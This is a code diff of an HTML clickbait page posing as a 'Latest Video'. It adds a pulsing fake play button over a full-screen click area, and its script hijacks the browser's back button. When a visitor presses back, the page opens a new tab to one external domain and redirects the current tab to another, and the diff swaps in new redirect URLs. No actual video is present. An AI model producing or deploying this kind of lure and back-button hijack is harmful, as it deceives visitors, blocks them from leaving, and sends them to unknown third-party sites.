@@ -5,7 +5,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Letest video</title>
-  <meta property="og:title" content="🔥Letest Video" />
+  <meta property="og:title" content="🔥Latest Video" />
   <meta property="og:description" content="⚡New video." />
   <meta property="og:image" content="https://www.shutterstock.com/shutterstock/videos/3700416707/thumb/8.jpg?ip=x480" />
   <meta property="og:type" content="website" />
@@ -21,31 +21,60 @@
 
     .fullscreen {
       width: 100%;
-      height: 100%;
-      background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgufczUSA_llu-32bkcjSBojRhqGewJCrqC7634rO_eszwchboy3jl7ZLCefILGciBhXTm9Kqtfo_deNv9cpgRsIr-fyWBve2p-y7v_AzeLHcAnoHzG7x6L8UbxkPLe4bWZpxPlRxaU6jyOj25yEQ-tLxPviCopVfGPhVsj3LEXXxLfLn2U-C2KGjFqDEpJ/s16000/post-thambale.jpg");
+      height: 100dvh;
+      background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAiHPuiysXTThXehZyjhFqaiFLFso5wKRVBJsWvHjTTmNqZUjXGHmYR6AWtWbbfsCdZXOmCA26uIG7ceIixuvjJVgtKi-6b1zfLe730qLyw5Sim7FVfBLlsI2JBi6TXuETaYXPXp2n94gkNo_lOGxMBd9ZEMI9Ou5bBvX2ks38yDlNz-M7Qu-_VLd21GXf/s16000/right.png");
       background-position: center;
       background-repeat: no-repeat;
       background-size: cover;
       cursor: pointer;
     }
 
-    /* Mobile & small devices */
+    .center-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      height: 100%;
+    }
+
+    .play-btn {
+      width: 130px;
+      height: 130px;
+      border-radius: 50%;
+      animation: pulse 1.5s infinite;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.5),
+    }
+
+    @keyframes pulse {
+      0% {
+        transform: scale(1);
+        opacity: 1;
+        box-shadow: 0 0 15px rgba(255, 255, 255, 0.5),
+      }
+
+      50% {
+        transform: scale(1.15);
+        opacity: 0.85;
+        box-shadow: 0 0 25px rgba(255, 255, 255, 0.8)
+      }
+
+      100% {
+        transform: scale(1);
+        opacity: 1;
+        box-shadow: 0 0 15px rgba(255, 255, 255, 0.5)
+      }
+    }
+
     @media (max-width: 768px) {
       .fullscreen {
         background-size: contain;
         background-color: #000;
       }
-    }
 
-    .overlay-text {
-      position: absolute;
-      bottom: 500px;
-      width: 100%;
-      text-align: center;
-      color: #fc0404;
-      font-size: 50px;
-      font-weight: bold;
-      text-shadow: 0 0 5px #000;
+      .play-btn {
+        width: 65px;
+        height: 65px;
+      }
     }
   </style>
 </head>
@@ -53,7 +82,9 @@
 <body>
 
   <div class="fullscreen" id="clickArea">
-    <div class="overlay-text"></div>
+    <div class="center-container"><img class="play-btn"
+        src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEQibpu7T-T3yKsZrhxTmuzoBGYRLWbyrR5ZHteYLb5IDMQ8f68DkZMJYwjosdQ82N1qJyfKRpB9_mz99idgeKJHjmdruuvH0kes7ehn4YJjiPuhFe90zMFV6nIOiIemdD53w6eLWhV5Y3lFcWMnyvsa0dqiS8zN49i-g7xYBs16VA-LaAIZbJEPj2kXi9/s16000/5.png"
+        alt="Play"></div>
   </div>
 
   <script>
@@ -66,8 +97,8 @@
       window.history.pushState(null, null, window.location.href);
 
       window.onpopstate = function () {
-        window.open("https://aroshirifa.com/new-tab-link", "_blank");
-        window.location.href = "https://asma.com";
+        window.open("https://confidecross.com/r17d0h5qw5?key=8a25a3fc2056a9691b0935844bb66781", "_blank");
+        window.location.href = "https://otieu.com/4/9545954";
       };
     })();
   </script>
